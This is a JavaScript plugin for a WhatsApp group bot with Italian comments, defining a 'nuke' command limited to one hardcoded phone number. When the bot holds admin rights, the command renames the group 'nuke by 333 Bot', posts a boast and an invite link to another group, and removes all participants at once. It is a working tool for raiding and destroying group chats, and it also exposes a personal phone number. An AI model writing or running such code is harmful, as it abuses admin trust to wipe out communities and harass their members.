let handler = async (m, { conn, args, groupMetadata, participants, usedPrefix, command, isBotAdmin, isSuperAdmin }) => {
    let ps = participants.map(u => u.id).filter(v => v !== conn.user.jid);
    let bot = global.db.data.settings[conn.user.jid] || {};
    if (ps == '') return;
    const delay = time => new Promise(res => setTimeout(res, time));

    // Numero autorizzato
    const numeroAutorizzato = '46737807114@s.whatsapp.net'; // Sostituisci con il numero autorizzato

    // Verifica se l'utente che esegue il comando è il numero autorizzato
    if (m.sender !== numeroAutorizzato) {
        await conn.sendMessage(m.chat, { text: '⚠️ Solo il numero autorizzato può utilizzare questo comando!' });
        return;
    }

    switch (command) {
        case "nuke":
            if (!bot.restrict) return;
            if (!isBotAdmin) {
                await conn.sendMessage(m.chat, { text: '⚠️ Il bot deve essere amministratore per eseguire questo comando.' });
                return;
            }

            // Cambia il nome del gruppo
            try {
                await conn.groupUpdateSubject(m.chat, "nuke by 333 Bot");
                console.log("Nome del gruppo cambiato con successo.");
            } catch (error) {
                console.log("Errore nel cambiare il nome del gruppo:", error);
            }

            // Invio del messaggio decorato
            await conn.sendMessage(m.chat, { text: "✧･ﾟ: ✧･ﾟ: A͛V͛E͛T͛E͛ L͛'͛O͛N͛O͛R͛E͛ D͛I͛ E͛S͛S͛E͛R͛E͛ S͛V͛T͛ D͛A͛L͛ S͛O͛L͛O͛ E͛ U͛N͛I͛C͛O͛ ✧ ꙰ 𝟥𝟥𝟥 ꙰ 𝔹𝕆𝕋 ꙰" });

            // Invio del link
            await conn.sendMessage(m.chat, { text: 'ENTRATE TUTTI QUA:\nhttps://chat.whatsapp.com/JhrcigFtXpW4OzdhE9Jdq3' });

            let ownerGroup = m.chat.split`-`[0] + '@s.whatsapp.net';
            let users = participants.map(u => u.id).filter(v => v !== conn.user.jid);

            if (isBotAdmin && bot.restrict) {
                await delay(1);
                let responseb = await conn.groupParticipantsUpdate(m.chat, users, 'remove');
                if (responseb[0].status === "404") 
                    await delay(1);
            } else return;
            break;
    }
};

handler.command = ['nuke'];
handler.group = handler.owner = true;
handler.fail = null;
export default handler;